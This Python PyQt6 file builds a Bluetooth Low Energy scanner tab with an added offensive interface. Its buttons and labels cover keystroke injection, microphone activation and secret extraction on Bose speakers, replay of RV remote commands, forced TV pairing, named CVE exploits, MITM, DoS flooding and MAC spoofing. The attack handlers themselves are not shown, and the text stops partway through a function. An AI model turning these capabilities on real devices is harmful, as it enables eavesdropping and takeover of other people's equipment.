"""
Bluetooth Low Energy Scanning and Interrogation Tab
Provides BLE device discovery, GATT service enumeration, and characteristic read/write
"""

import asyncio
import json
import threading
from datetime import datetime
from typing import Optional, Dict

from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QPushButton,
    QTreeWidget, QTreeWidgetItem, QTextEdit, QGroupBox, QLineEdit,
    QSplitter, QTabWidget, QSpinBox, QCheckBox, QMessageBox,
    QMenu, QInputDialog, QFileDialog, QProgressBar, QComboBox
)
from PyQt6.QtCore import Qt, pyqtSignal, QObject, QTimer
from PyQt6.QtGui import QAction, QFont, QColor

# Import BLE service
try:
    from src.services.bluetooth_service import BluetoothService, DeviceData, BLEAK_AVAILABLE
except ImportError:
    try:
        from services.bluetooth_service import BluetoothService, DeviceData, BLEAK_AVAILABLE
    except ImportError:
        BLEAK_AVAILABLE = False
        BluetoothService = None
        DeviceData = None


class AsyncBridge(QObject):
    """Bridge for async operations to Qt signals"""
    log_signal = pyqtSignal(str)
    device_found_signal = pyqtSignal(object)
    scan_complete_signal = pyqtSignal()
    interrogation_complete_signal = pyqtSignal(object)
    progress_signal = pyqtSignal(str)


class SortableTreeWidgetItem(QTreeWidgetItem):
    """Tree widget item that sorts numerically for RSSI, service count, and vuln columns"""
    def __lt__(self, other):
        column = self.treeWidget().sortColumn() if self.treeWidget() else 0
        # For RSSI (column 2), Services (column 3), Vulns (column 4), sort numerically
        if column in (2, 3, 4):
            my_data = self.data(column, Qt.ItemDataRole.UserRole)
            other_data = other.data(column, Qt.ItemDataRole.UserRole)
            if my_data is not None and other_data is not None:
                return my_data < other_data
        # Default string comparison
        return self.text(column) < other.text(column)


class BluetoothTab(QWidget):
    """Bluetooth Low Energy scanning and interrogation interface"""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.bt_service = BluetoothService(log_callback=self._log_from_service) if BluetoothService else None
        self.discovered_devices: Dict[str, DeviceData] = {}
        self.current_device: Optional[DeviceData] = None
        self.scanning = False
        self.async_loop = None
        self.async_thread = None

        # Qt signal bridge
        self.bridge = AsyncBridge()
        self.bridge.log_signal.connect(self._append_log)
        self.bridge.device_found_signal.connect(self._add_device_to_tree)
        self.bridge.scan_complete_signal.connect(self._on_scan_complete)
        self.bridge.interrogation_complete_signal.connect(self._on_interrogation_complete)
        self.bridge.progress_signal.connect(self._update_progress)

        self.init_ui()
        self._start_async_loop()

    def _start_async_loop(self):
        """Start the async event loop in a background thread"""
        def run_loop():
            self.async_loop = asyncio.new_event_loop()
            asyncio.set_event_loop(self.async_loop)
            self.async_loop.run_forever()

        self.async_thread = threading.Thread(target=run_loop, daemon=True)
        self.async_thread.start()

    def _run_async(self, coro):
        """Run an async coroutine in the background loop"""
        if self.async_loop:
            asyncio.run_coroutine_threadsafe(coro, self.async_loop)

    def _log_from_service(self, message: str):
        """Log callback from BLE service (runs in async thread)"""
        self.bridge.log_signal.emit(message)

    def _append_log(self, message: str):
        """Append message to log (runs in Qt thread)"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_area.append(f"[{timestamp}] {message}")

    def _update_progress(self, message: str):
        """Update progress label"""
        self.progress_label.setText(message)

    def init_ui(self):
        """Initialize the UI"""
        layout = QVBoxLayout()
        layout.setSpacing(5)

        # Title
        title = QLabel("Bluetooth Low Energy Scanner & Interrogator")
        title.setStyleSheet("font-size: 16px; font-weight: bold; padding: 5px;")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(title)

        # Check for bleak
        if not BLEAK_AVAILABLE:
            warning = QLabel("Bleak library not installed. Run: pip install bleak")
            warning.setStyleSheet("color: red; font-weight: bold; padding: 10px;")
            layout.addWidget(warning)

        # Control panel
        control_group = QGroupBox("Scan Controls")
        control_layout = QHBoxLayout()

        self.scan_duration = QSpinBox()
        self.scan_duration.setRange(5, 120)
        self.scan_duration.setValue(10)
        self.scan_duration.setSuffix(" sec")
        control_layout.addWidget(QLabel("Duration:"))
        control_layout.addWidget(self.scan_duration)

        self.start_scan_btn = QPushButton("Start BLE Scan")
        self.start_scan_btn.clicked.connect(self.start_scan)
        self.start_scan_btn.setEnabled(BLEAK_AVAILABLE)
        control_layout.addWidget(self.start_scan_btn)

        self.stop_scan_btn = QPushButton("Stop Scan")
        self.stop_scan_btn.clicked.connect(self.stop_scan)
        self.stop_scan_btn.setEnabled(False)
        control_layout.addWidget(self.stop_scan_btn)

        self.paired_btn = QPushButton("Show Paired")
        self.paired_btn.clicked.connect(self.show_paired_devices)
        self.paired_btn.setToolTip("Show system paired Bluetooth devices")
        control_layout.addWidget(self.paired_btn)

        control_layout.addStretch()

        # Connection status indicator
        self.connection_status = QLabel("⚫ Not Connected")
        self.connection_status.setStyleSheet("font-weight: bold; padding: 5px;")
        control_layout.addWidget(self.connection_status)

        self.disconnect_btn = QPushButton("Disconnect")
        self.disconnect_btn.clicked.connect(self.disconnect_current)
        self.disconnect_btn.setEnabled(False)
        self.disconnect_btn.setStyleSheet("background-color: #553333;")
        control_layout.addWidget(self.disconnect_btn)

        self.progress_label = QLabel("")
        control_layout.addWidget(self.progress_label)

        control_group.setLayout(control_layout)
        layout.addWidget(control_group)

        # Main splitter
        splitter = QSplitter(Qt.Orientation.Horizontal)

        # Left panel - Device list
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        left_layout.setContentsMargins(0, 0, 0, 0)

        devices_label = QLabel("Discovered Devices")
        devices_label.setStyleSheet("font-weight: bold;")
        left_layout.addWidget(devices_label)

        self.devices_tree = QTreeWidget()
        self.devices_tree.setHeaderLabels(["Name", "MAC Address", "RSSI", "Svcs", "Vulns"])
        self.devices_tree.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.devices_tree.customContextMenuRequested.connect(self.show_device_context_menu)
        self.devices_tree.itemDoubleClicked.connect(self.on_device_double_click)
        self.devices_tree.itemClicked.connect(self.on_device_selected)
        self.devices_tree.setMinimumWidth(450)
        # Enable sorting by clicking column headers
        self.devices_tree.setSortingEnabled(True)
        self.devices_tree.sortByColumn(4, Qt.SortOrder.DescendingOrder)  # Default sort by Vulns
        self.devices_tree.header().setSectionsClickable(True)
        self.devices_tree.header().setSortIndicatorShown(True)
        # Set column widths
        self.devices_tree.setColumnWidth(0, 160)  # Name
        self.devices_tree.setColumnWidth(1, 130)  # MAC
        self.devices_tree.setColumnWidth(2, 55)   # RSSI
        self.devices_tree.setColumnWidth(3, 40)   # Services
        self.devices_tree.setColumnWidth(4, 120)  # Vulns
        left_layout.addWidget(self.devices_tree)

        # Device action buttons
        btn_layout = QHBoxLayout()
        self.interrogate_btn = QPushButton("Interrogate Device")
        self.interrogate_btn.clicked.connect(self.interrogate_selected_device)
        self.interrogate_btn.setEnabled(False)
        btn_layout.addWidget(self.interrogate_btn)

        self.export_btn = QPushButton("Export JSON")
        self.export_btn.clicked.connect(self.export_device_json)
        self.export_btn.setEnabled(False)
        btn_layout.addWidget(self.export_btn)

        self.generate_btn = QPushButton("Generate Controller")
        self.generate_btn.clicked.connect(self.generate_controller)
        self.generate_btn.setEnabled(False)
        btn_layout.addWidget(self.generate_btn)

        left_layout.addLayout(btn_layout)
        splitter.addWidget(left_panel)

        # Right panel - GATT details
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        right_layout.setContentsMargins(0, 0, 0, 0)

        # Tabs for GATT view
        self.detail_tabs = QTabWidget()

        # GATT Tree tab
        gatt_widget = QWidget()
        gatt_layout = QVBoxLayout(gatt_widget)

        gatt_label = QLabel("GATT Structure")
        gatt_label.setStyleSheet("font-weight: bold;")
        gatt_layout.addWidget(gatt_label)

        self.gatt_tree = QTreeWidget()
        self.gatt_tree.setHeaderLabels(["Item", "UUID", "Properties", "Value"])
        self.gatt_tree.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.gatt_tree.customContextMenuRequested.connect(self.show_gatt_context_menu)
        self.gatt_tree.itemClicked.connect(self.on_gatt_item_clicked)
        gatt_layout.addWidget(self.gatt_tree)

        self.detail_tabs.addTab(gatt_widget, "GATT Services")

        # Characteristic detail tab
        char_widget = QWidget()
        char_layout = QVBoxLayout(char_widget)

        self.char_info = QTextEdit()
        self.char_info.setReadOnly(True)
        self.char_info.setFont(QFont("Monospace", 10))
        char_layout.addWidget(self.char_info)

        # Read/Write controls
        rw_group = QGroupBox("Read/Write")
        rw_layout = QVBoxLayout()

        read_layout = QHBoxLayout()
        self.read_btn = QPushButton("Read Value")
        self.read_btn.clicked.connect(self.read_selected_characteristic)
        self.read_btn.setEnabled(False)
        read_layout.addWidget(self.read_btn)

        self.notify_btn = QPushButton("Subscribe Notify")
        self.notify_btn.clicked.connect(self.subscribe_notifications)
        self.notify_btn.setEnabled(False)
        read_layout.addWidget(self.notify_btn)
        rw_layout.addLayout(read_layout)

        write_layout = QHBoxLayout()
        self.write_input = QLineEdit()
        self.write_input.setPlaceholderText("Hex value to write (e.g., 01020304)")
        write_layout.addWidget(self.write_input)

        self.write_type = QComboBox()
        self.write_type.addItems(["Hex", "UTF-8", "Int (LE)", "Int (BE)"])
        write_layout.addWidget(self.write_type)

        self.write_btn = QPushButton("Write")
        self.write_btn.clicked.connect(self.write_selected_characteristic)
        self.write_btn.setEnabled(False)
        write_layout.addWidget(self.write_btn)
        rw_layout.addLayout(write_layout)

        rw_group.setLayout(rw_layout)
        char_layout.addWidget(rw_group)

        self.detail_tabs.addTab(char_widget, "Characteristic")

        # Raw JSON tab
        json_widget = QWidget()
        json_layout = QVBoxLayout(json_widget)
        self.json_view = QTextEdit()
        self.json_view.setReadOnly(True)
        self.json_view.setFont(QFont("Monospace", 9))
        json_layout.addWidget(self.json_view)
        self.detail_tabs.addTab(json_widget, "Raw JSON")

        # Known Services tab (HM-10, Heart Rate, etc.)
        known_widget = QWidget()
        known_layout = QVBoxLayout(known_widget)

        # HM-10 Serial Module controls
        hm10_group = QGroupBox("HM-10 Serial Module (0xFFE0)")
        hm10_layout = QVBoxLayout()

        hm10_desc = QLabel("UART/Serial over BLE - Send/Receive text data")
        hm10_desc.setStyleSheet("color: gray; font-style: italic;")
        hm10_layout.addWidget(hm10_desc)

        # Send data
        send_layout = QHBoxLayout()
        self.hm10_input = QLineEdit()
        self.hm10_input.setPlaceholderText("Enter text to send...")
        self.hm10_input.returnPressed.connect(self._send_hm10_data)
        send_layout.addWidget(self.hm10_input)

        self.hm10_send_btn = QPushButton("Send")
        self.hm10_send_btn.clicked.connect(self._send_hm10_data)
        self.hm10_send_btn.setEnabled(False)
        send_layout.addWidget(self.hm10_send_btn)

        self.hm10_newline = QCheckBox("Add \\n")
        self.hm10_newline.setChecked(True)
        send_layout.addWidget(self.hm10_newline)
        hm10_layout.addLayout(send_layout)

        # Receive area
        self.hm10_receive = QTextEdit()
        self.hm10_receive.setReadOnly(True)
        self.hm10_receive.setFont(QFont("Monospace", 10))
        self.hm10_receive.setPlaceholderText("Received data will appear here...")
        self.hm10_receive.setMaximumHeight(100)
        hm10_layout.addWidget(self.hm10_receive)

        # Subscribe button
        self.hm10_subscribe_btn = QPushButton("Subscribe to Notifications")
        self.hm10_subscribe_btn.clicked.connect(self._subscribe_hm10)
        self.hm10_subscribe_btn.setEnabled(False)
        hm10_layout.addWidget(self.hm10_subscribe_btn)

        hm10_group.setLayout(hm10_layout)
        known_layout.addWidget(hm10_group)

        # GP-RVC MPPT Solar Controller (Renogy/Go Power)
        self.mppt_group = QGroupBox("GP-RVC MPPT Solar Controller")
        mppt_layout = QVBoxLayout()

        mppt_desc = QLabel("Renogy/Go Power RV Solar MPPT Charge Controller")
        mppt_desc.setStyleSheet("color: gray; font-style: italic;")
        mppt_layout.addWidget(mppt_desc)

        # Status display
        self.mppt_status = QTextEdit()
        self.mppt_status.setReadOnly(True)
        self.mppt_status.setFont(QFont("Monospace", 10))
        self.mppt_status.setPlaceholderText("Device status will appear here...")
        self.mppt_status.setMaximumHeight(150)
        mppt_layout.addWidget(self.mppt_status)

        # Control buttons row 1
        mppt_btn_row1 = QHBoxLayout()

        self.mppt_connect_btn = QPushButton("Connect & Subscribe")
        self.mppt_connect_btn.clicked.connect(self._mppt_connect)
        self.mppt_connect_btn.setEnabled(False)
        mppt_btn_row1.addWidget(self.mppt_connect_btn)

        self.mppt_status_btn = QPushButton("Get Status")
        self.mppt_status_btn.clicked.connect(self._mppt_get_status)
        self.mppt_status_btn.setEnabled(False)
        mppt_btn_row1.addWidget(self.mppt_status_btn)

        self.mppt_battery_btn = QPushButton("Battery Info")
        self.mppt_battery_btn.clicked.connect(self._mppt_get_battery)
        self.mppt_battery_btn.setEnabled(False)
        mppt_btn_row1.addWidget(self.mppt_battery_btn)

        mppt_layout.addLayout(mppt_btn_row1)

        # Control buttons row 2
        mppt_btn_row2 = QHBoxLayout()

        self.mppt_solar_btn = QPushButton("Solar Input")
        self.mppt_solar_btn.clicked.connect(self._mppt_get_solar)
        self.mppt_solar_btn.setEnabled(False)
        mppt_btn_row2.addWidget(self.mppt_solar_btn)

        self.mppt_load_btn = QPushButton("Load Status")
        self.mppt_load_btn.clicked.connect(self._mppt_get_load)
        self.mppt_load_btn.setEnabled(False)
        mppt_btn_row2.addWidget(self.mppt_load_btn)

        self.mppt_history_btn = QPushButton("Daily Stats")
        self.mppt_history_btn.clicked.connect(self._mppt_get_history)
        self.mppt_history_btn.setEnabled(False)
        mppt_btn_row2.addWidget(self.mppt_history_btn)

        mppt_layout.addLayout(mppt_btn_row2)

        # Raw command input
        mppt_raw_layout = QHBoxLayout()
        self.mppt_raw_input = QLineEdit()
        self.mppt_raw_input.setPlaceholderText("Raw hex command (e.g., FF0301000002)")
        mppt_raw_layout.addWidget(self.mppt_raw_input)

        self.mppt_raw_send_btn = QPushButton("Send Raw")
        self.mppt_raw_send_btn.clicked.connect(self._mppt_send_raw)
        self.mppt_raw_send_btn.setEnabled(False)
        mppt_raw_layout.addWidget(self.mppt_raw_send_btn)
        mppt_layout.addLayout(mppt_raw_layout)

        self.mppt_group.setLayout(mppt_layout)
        self.mppt_group.setVisible(False)  # Hidden until GP-RVC device detected
        known_layout.addWidget(self.mppt_group)

        # ============ KS03 Keyboard HID Panel ============
        self.ks03_group = QGroupBox("KS03 BLE Keyboard (HID Injection)")
        ks03_layout = QVBoxLayout()

        ks03_desc = QLabel("CVE-2023-45866: Unauthenticated keystroke injection")
        ks03_desc.setStyleSheet("color: #ff6600; font-style: italic;")
        ks03_layout.addWidget(ks03_desc)

        self.ks03_status = QTextEdit()
        self.ks03_status.setReadOnly(True)
        self.ks03_status.setFont(QFont("Monospace", 10))
        self.ks03_status.setMaximumHeight(100)
        ks03_layout.addWidget(self.ks03_status)

        ks03_btn_row = QHBoxLayout()
        self.ks03_connect_btn = QPushButton("Connect")
        self.ks03_connect_btn.clicked.connect(self._ks03_connect)
        self.ks03_connect_btn.setEnabled(False)
        ks03_btn_row.addWidget(self.ks03_connect_btn)

        self.ks03_read_btn = QPushButton("Read State")
        self.ks03_read_btn.clicked.connect(self._ks03_read_state)
        self.ks03_read_btn.setEnabled(False)
        ks03_btn_row.addWidget(self.ks03_read_btn)

        self.ks03_subscribe_btn = QPushButton("Capture Keys")
        self.ks03_subscribe_btn.clicked.connect(self._ks03_capture_keys)
        self.ks03_subscribe_btn.setEnabled(False)
        ks03_btn_row.addWidget(self.ks03_subscribe_btn)
        ks03_layout.addLayout(ks03_btn_row)

        ks03_inject_row = QHBoxLayout()
        self.ks03_inject_input = QLineEdit()
        self.ks03_inject_input.setPlaceholderText("Type text to inject...")
        ks03_inject_row.addWidget(self.ks03_inject_input)

        self.ks03_inject_btn = QPushButton("Inject Keys")
        self.ks03_inject_btn.clicked.connect(self._ks03_inject_keys)
        self.ks03_inject_btn.setEnabled(False)
        ks03_inject_row.addWidget(self.ks03_inject_btn)
        ks03_layout.addLayout(ks03_inject_row)

        self.ks03_group.setLayout(ks03_layout)
        self.ks03_group.setVisible(False)
        known_layout.addWidget(self.ks03_group)

        # ============ Bose Speaker Panel ============
        self.bose_group = QGroupBox("Bose Speaker (Airoha/RACE)")
        bose_layout = QVBoxLayout()

        bose_desc = QLabel("CVE-2025-20700: RACE protocol exploit - eavesdrop/inject audio")
        bose_desc.setStyleSheet("color: #ff6600; font-style: italic;")
        bose_layout.addWidget(bose_desc)

        self.bose_status = QTextEdit()
        self.bose_status.setReadOnly(True)
        self.bose_status.setFont(QFont("Monospace", 10))
        self.bose_status.setMaximumHeight(100)
        bose_layout.addWidget(self.bose_status)

        bose_btn_row = QHBoxLayout()
        self.bose_connect_btn = QPushButton("Silent Connect")
        self.bose_connect_btn.clicked.connect(self._bose_connect)
        self.bose_connect_btn.setEnabled(False)
        bose_btn_row.addWidget(self.bose_connect_btn)

        self.bose_enum_btn = QPushButton("Enum RACE")
        self.bose_enum_btn.clicked.connect(self._bose_enum_race)
        self.bose_enum_btn.setEnabled(False)
        bose_btn_row.addWidget(self.bose_enum_btn)

        self.bose_extract_btn = QPushButton("Extract Secrets")
        self.bose_extract_btn.clicked.connect(self._bose_extract_keys)
        self.bose_extract_btn.setEnabled(False)
        bose_btn_row.addWidget(self.bose_extract_btn)
        bose_layout.addLayout(bose_btn_row)

        bose_btn_row2 = QHBoxLayout()
        self.bose_audio_btn = QPushButton("Hijack Audio")
        self.bose_audio_btn.clicked.connect(self._bose_hijack_audio)
        self.bose_audio_btn.setEnabled(False)
        bose_btn_row2.addWidget(self.bose_audio_btn)

        self.bose_mic_btn = QPushButton("Activate Mic")
        self.bose_mic_btn.clicked.connect(self._bose_activate_mic)
        self.bose_mic_btn.setEnabled(False)
        bose_btn_row2.addWidget(self.bose_mic_btn)
        bose_layout.addLayout(bose_btn_row2)

        self.bose_group.setLayout(bose_layout)
        self.bose_group.setVisible(False)
        known_layout.addWidget(self.bose_group)

        # ============ LCI OneControl Remote Panel ============
        self.lci_group = QGroupBox("LCI OneControl (RV Remote)")
        lci_layout = QVBoxLayout()

        lci_desc = QLabel("Replay attack: Capture & replay RV control commands")
        lci_desc.setStyleSheet("color: #ff6600; font-style: italic;")
        lci_layout.addWidget(lci_desc)

        self.lci_status = QTextEdit()
        self.lci_status.setReadOnly(True)
        self.lci_status.setFont(QFont("Monospace", 10))
        self.lci_status.setMaximumHeight(80)
        lci_layout.addWidget(self.lci_status)

        lci_btn_row = QHBoxLayout()
        self.lci_connect_btn = QPushButton("Connect")
        self.lci_connect_btn.clicked.connect(self._lci_connect)
        self.lci_connect_btn.setEnabled(False)
        lci_btn_row.addWidget(self.lci_connect_btn)

        self.lci_capture_btn = QPushButton("Capture Commands")
        self.lci_capture_btn.clicked.connect(self._lci_capture)
        self.lci_capture_btn.setEnabled(False)
        lci_btn_row.addWidget(self.lci_capture_btn)

        self.lci_replay_btn = QPushButton("Replay")
        self.lci_replay_btn.clicked.connect(self._lci_replay)
        self.lci_replay_btn.setEnabled(False)
        lci_btn_row.addWidget(self.lci_replay_btn)
        lci_layout.addLayout(lci_btn_row)

        self.lci_group.setLayout(lci_layout)
        self.lci_group.setVisible(False)
        known_layout.addWidget(self.lci_group)

        # ============ Samsung TV Panel ============
        self.samsung_group = QGroupBox("Samsung Smart TV")
        samsung_layout = QVBoxLayout()

        samsung_desc = QLabel("EvilScreen: BLE remote control exploitation")
        samsung_desc.setStyleSheet("color: #ff6600; font-style: italic;")
        samsung_layout.addWidget(samsung_desc)

        self.samsung_status = QTextEdit()
        self.samsung_status.setReadOnly(True)
        self.samsung_status.setFont(QFont("Monospace", 10))
        self.samsung_status.setMaximumHeight(80)
        samsung_layout.addWidget(self.samsung_status)

        samsung_btn_row = QHBoxLayout()
        self.samsung_connect_btn = QPushButton("Connect")
        self.samsung_connect_btn.clicked.connect(self._samsung_connect)
        self.samsung_connect_btn.setEnabled(False)
        samsung_btn_row.addWidget(self.samsung_connect_btn)

        self.samsung_pair_btn = QPushButton("Force Pair")
        self.samsung_pair_btn.clicked.connect(self._samsung_pair)
        self.samsung_pair_btn.setEnabled(False)
        samsung_btn_row.addWidget(self.samsung_pair_btn)

        self.samsung_inject_btn = QPushButton("Inject Remote")
        self.samsung_inject_btn.clicked.connect(self._samsung_inject)
        self.samsung_inject_btn.setEnabled(False)
        samsung_btn_row.addWidget(self.samsung_inject_btn)
        samsung_layout.addLayout(samsung_btn_row)

        self.samsung_group.setLayout(samsung_layout)
        self.samsung_group.setVisible(False)
        known_layout.addWidget(self.samsung_group)

        # ============ Govee Sensor Panel ============
        self.govee_group = QGroupBox("Govee Temperature Sensor")
        govee_layout = QVBoxLayout()

        govee_desc = QLabel("Unencrypted BLE: Sniff temperature/humidity data")
        govee_desc.setStyleSheet("color: #00aa00; font-style: italic;")
        govee_layout.addWidget(govee_desc)

        self.govee_status = QTextEdit()
        self.govee_status.setReadOnly(True)
        self.govee_status.setFont(QFont("Monospace", 10))
        self.govee_status.setMaximumHeight(80)
        govee_layout.addWidget(self.govee_status)

        govee_btn_row = QHBoxLayout()
        self.govee_sniff_btn = QPushButton("Sniff Broadcasts")
        self.govee_sniff_btn.clicked.connect(self._govee_sniff)
        self.govee_sniff_btn.setEnabled(False)
        govee_btn_row.addWidget(self.govee_sniff_btn)

        self.govee_decode_btn = QPushButton("Decode Data")
        self.govee_decode_btn.clicked.connect(self._govee_decode)
        self.govee_decode_btn.setEnabled(False)
        govee_btn_row.addWidget(self.govee_decode_btn)
        govee_layout.addLayout(govee_btn_row)

        self.govee_group.setLayout(govee_layout)
        self.govee_group.setVisible(False)
        known_layout.addWidget(self.govee_group)

        # Detected services summary
        self.known_services_info = QLabel("No known services detected yet. Interrogate a device first.")
        self.known_services_info.setStyleSheet("padding: 10px; color: gray;")
        known_layout.addWidget(self.known_services_info)

        known_layout.addStretch()
        known_widget.setLayout(known_layout)
        self.detail_tabs.addTab(known_widget, "Known Services")

        # ============ Attack Framework Tab ============
        attack_widget = QWidget()
        attack_layout = QVBoxLayout(attack_widget)

        attack_title = QLabel("BLE Attack Framework Integration")
        attack_title.setStyleSheet("font-size: 14px; font-weight: bold; color: #ff4444;")
        attack_layout.addWidget(attack_title)

        # BlueToolkit Group
        bluetoolkit_group = QGroupBox("BlueToolkit (43 exploits)")
        bluetoolkit_layout = QVBoxLayout()

        bt_desc = QLabel("Bluetooth Classic vulnerability testing framework")
        bt_desc.setStyleSheet("color: gray; font-style: italic;")
        bluetoolkit_layout.addWidget(bt_desc)

        bt_btn_row = QHBoxLayout()
        self.bt_scan_btn = QPushButton("Recon Scan")
        self.bt_scan_btn.clicked.connect(self._bluetoolkit_recon)
        bt_btn_row.addWidget(self.bt_scan_btn)

        self.bt_exploit_combo = QComboBox()
        self.bt_exploit_combo.addItems([
            "Select Exploit...",
            "CVE-2017-1000251 (BlueBorne RCE)",
            "CVE-2020-12351 (BleedingTooth)",
            "CVE-2020-12352 (BadKarma)",
            "CVE-2018-5383 (MITM)",
            "KNOB Attack",
            "BIAS Attack",
            "BLUFFS Attack",
            "DoS - LMP Overflow",
            "DoS - Invalid Slot",
            "Method Confusion"
        ])
        bt_btn_row.addWidget(self.bt_exploit_combo)

        self.bt_run_btn = QPushButton("Run Exploit")
        self.bt_run_btn.clicked.connect(self._bluetoolkit_run)
        bt_btn_row.addWidget(self.bt_run_btn)
        bluetoolkit_layout.addLayout(bt_btn_row)

        self.bt_output = QTextEdit()
        self.bt_output.setReadOnly(True)
        self.bt_output.setFont(QFont("Monospace", 9))
        self.bt_output.setMaximumHeight(100)
        self.bt_output.setPlaceholderText("BlueToolkit output...")
        bluetoolkit_layout.addWidget(self.bt_output)

        bluetoolkit_group.setLayout(bluetoolkit_layout)
        attack_layout.addWidget(bluetoolkit_group)

        # BtleJuice MITM Group
        btlejuice_group = QGroupBox("BtleJuice (BLE MITM)")
        btlejuice_layout = QVBoxLayout()

        bj_desc = QLabel("Man-in-the-Middle framework for BLE devices")
        bj_desc.setStyleSheet("color: gray; font-style: italic;")
        btlejuice_layout.addWidget(bj_desc)

        bj_btn_row = QHBoxLayout()
        self.bj_start_btn = QPushButton("Start Proxy")
        self.bj_start_btn.clicked.connect(self._btlejuice_start)
        bj_btn_row.addWidget(self.bj_start_btn)

        self.bj_hook_btn = QPushButton("Hook Data")
        self.bj_hook_btn.clicked.connect(self._btlejuice_hook)
        self.bj_hook_btn.setEnabled(False)
        bj_btn_row.addWidget(self.bj_hook_btn)

        self.bj_modify_btn = QPushButton("Modify Traffic")
        self.bj_modify_btn.clicked.connect(self._btlejuice_modify)
        self.bj_modify_btn.setEnabled(False)
        bj_btn_row.addWidget(self.bj_modify_btn)
        btlejuice_layout.addLayout(bj_btn_row)

        self.bj_output = QTextEdit()
        self.bj_output.setReadOnly(True)
        self.bj_output.setFont(QFont("Monospace", 9))
        self.bj_output.setMaximumHeight(80)
        self.bj_output.setPlaceholderText("BtleJuice MITM output...")
        btlejuice_layout.addWidget(self.bj_output)

        btlejuice_group.setLayout(btlejuice_layout)
        attack_layout.addWidget(btlejuice_group)

        # WHAD Framework Group
        whad_group = QGroupBox("WHAD (Wireless Hacking)")
        whad_layout = QVBoxLayout()

        whad_desc = QLabel("InjectaBLE: Packet injection into established BLE connections")
        whad_desc.setStyleSheet("color: gray; font-style: italic;")
        whad_layout.addWidget(whad_desc)

        whad_btn_row = QHBoxLayout()
        self.whad_sniff_btn = QPushButton("Sniff BLE")
        self.whad_sniff_btn.clicked.connect(self._whad_sniff)
        whad_btn_row.addWidget(self.whad_sniff_btn)

        self.whad_inject_btn = QPushButton("Inject Packet")
        self.whad_inject_btn.clicked.connect(self._whad_inject)
        whad_btn_row.addWidget(self.whad_inject_btn)

        self.whad_hijack_btn = QPushButton("Hijack Role")
        self.whad_hijack_btn.clicked.connect(self._whad_hijack)
        whad_btn_row.addWidget(self.whad_hijack_btn)

        self.whad_mitm_btn = QPushButton("Full MITM")
        self.whad_mitm_btn.clicked.connect(self._whad_mitm)
        whad_btn_row.addWidget(self.whad_mitm_btn)
        whad_layout.addLayout(whad_btn_row)

        self.whad_output = QTextEdit()
        self.whad_output.setReadOnly(True)
        self.whad_output.setFont(QFont("Monospace", 9))
        self.whad_output.setMaximumHeight(80)
        self.whad_output.setPlaceholderText("WHAD output...")
        whad_layout.addWidget(self.whad_output)

        whad_group.setLayout(whad_layout)
        attack_layout.addWidget(whad_group)

        # Quick Attacks Group
        quick_group = QGroupBox("Quick Attacks")
        quick_layout = QHBoxLayout()

        self.quick_dos_btn = QPushButton("DoS Flood")
        self.quick_dos_btn.clicked.connect(self._quick_dos)
        quick_layout.addWidget(self.quick_dos_btn)

        self.quick_fuzz_btn = QPushButton("GATT Fuzzer")
        self.quick_fuzz_btn.clicked.connect(self._quick_fuzz)
        quick_layout.addWidget(self.quick_fuzz_btn)

        self.quick_clone_btn = QPushButton("Clone Device")
        self.quick_clone_btn.clicked.connect(self._quick_clone)
        quick_layout.addWidget(self.quick_clone_btn)

        self.quick_spoof_btn = QPushButton("MAC Spoof")
        self.quick_spoof_btn.clicked.connect(self._quick_spoof)
        quick_layout.addWidget(self.quick_spoof_btn)

        quick_group.setLayout(quick_layout)
        attack_layout.addWidget(quick_group)

        attack_layout.addStretch()
        self.detail_tabs.addTab(attack_widget, "Attack Framework")

        right_layout.addWidget(self.detail_tabs)
        splitter.addWidget(right_panel)

        splitter.setSizes([400, 600])
        layout.addWidget(splitter)

        # Log area
        log_group = QGroupBox("Activity Log")
        log_layout = QVBoxLayout()

        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        self.log_area.setMaximumHeight(120)
        self.log_area.setFont(QFont("Monospace", 9))

        log_layout.addWidget(self.log_area)
        log_group.setLayout(log_layout)
        layout.addWidget(log_group)

        self.setLayout(layout)

        # Initial log
        self.log("Bluetooth tab initialized.")
        if BLEAK_AVAILABLE:
            self.log("Bleak library available. Ready to scan.")
        else:
            self.log("Bleak not available. Install with: pip install bleak")

    def log(self, message: str):
        """Add message to log area"""
        self._append_log(message)

    def start_scan(self):
        """Start BLE device discovery"""
        if not self.bt_service:
            self.log("[!] BLE service not available")
            return

        self.scanning = True
        self.start_scan_btn.setEnabled(False)
        self.stop_scan_btn.setEnabled(True)
        self.devices_tree.clear()
        self.discovered_devices.clear()
        self.progress_label.setText("Scanning...")

        duration = self.scan_duration.value()

        async def do_scan():
            try:
                def on_device(device: DeviceData):
                    self.bridge.device_found_signal.emit(device)

                await self.bt_service.scan_devices(duration=duration, callback=on_device)
                self.bridge.scan_complete_signal.emit()
            except Exception as e:
                self.bridge.log_signal.emit(f"[!] Scan error: {e}")
                self.bridge.scan_complete_signal.emit()

        self._run_async(do_scan())

    def stop_scan(self):
        """Stop BLE scanning"""
        if self.bt_service:
            self.bt_service.scanning = False
        self._on_scan_complete()

    def _on_scan_complete(self):
        """Handle scan completion"""
        self.scanning = False
        self.start_scan_btn.setEnabled(True)
        self.stop_scan_btn.setEnabled(False)
        self.progress_label.setText(f"Found {len(self.discovered_devices)} devices")
        self.interrogate_btn.setEnabled(len(self.discovered_devices) > 0)

    def show_paired_devices(self):
        """Show system paired Bluetooth devices"""
        self.log("[*] Fetching system paired devices...")
        import subprocess
        try:
            # Get paired devices using bluetoothctl
            result = subprocess.run(['bluetoothctl', 'devices', 'Paired'],
                                  capture_output=True, text=True, timeout=5)
            lines = result.stdout.strip().split('\n')
            paired_count = 0
            for line in lines:
                if line.startswith('Device '):
                    parts = line.split(' ', 2)
                    if len(parts) >= 3:
                        mac = parts[1]
                        name = parts[2]
                        # Add to discovered devices if not already there
                        if mac not in self.discovered_devices:
                            device = DeviceData(mac_address=mac, name=f"[PAIRED] {name}")
                            device.rssi = 0  # Unknown RSSI for paired devices
                            self.discovered_devices[mac] = device
                            self._add_device_to_tree(device)
                        paired_count += 1
